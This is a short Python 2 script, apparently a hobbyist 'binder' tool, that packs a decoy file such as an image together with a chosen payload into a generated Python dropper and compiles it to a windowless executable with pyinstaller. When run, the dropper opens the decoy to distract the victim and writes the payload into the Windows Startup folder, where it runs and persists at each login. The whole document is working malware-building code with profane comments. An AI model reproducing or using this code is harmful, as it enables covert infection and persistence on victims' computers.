#####in the name of __fuck_____
### 1 binder by demonpy


from base64 import b64encode
print "WHAT THE HELL IS THIS :)"
print "*********************"

file1=input('jpg or anyfile(dont set payload) => ')
filer1=open(file1,'rb').read()
file2=input('now set payload => ')
filer2=open(file2,'rb').read()
file1_B64_encode=b64encode(filer1)
file2_B64_encode=b64encode(filer2)
open('binded.py','w').write('''#coding:utf-8
from os import path,startfile
from getpass import getuser
from tempfile import gettempdir
from base64 import b64decode
from time import sleep
import sys
exec("""
payload_dir=sys.argv[0]
payload=open(payload_dir.decode('utf8'),'rb').read()
open(path.join(gettempdir(),'nordjik.exe'),'wb').write(payload)
file1_b64_decode=b64decode('%s')
file2_b64_decode=b64decode('%s')
file1=path.join(gettempdir(),'%s')
open(file1,'wb').write(file1_b64_decode)
startfile(file1)
user=getuser()
start="C:\\Users\\kk"
start=start.replace('kk',user)+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
file2=path.join(start,'%s')
if path.exists(file2)==False:
    open(file2,'wb').write(file2_b64_decode)
        
    startfile(file2)
sys.exit()""")
'''%(file1_B64_encode,file2_B64_encode,file1,file2))
import os
os.system('pyinstaller --clean --noconsole --windowed --onefile binded.py"')
print "say fuck 2 world guys :)"

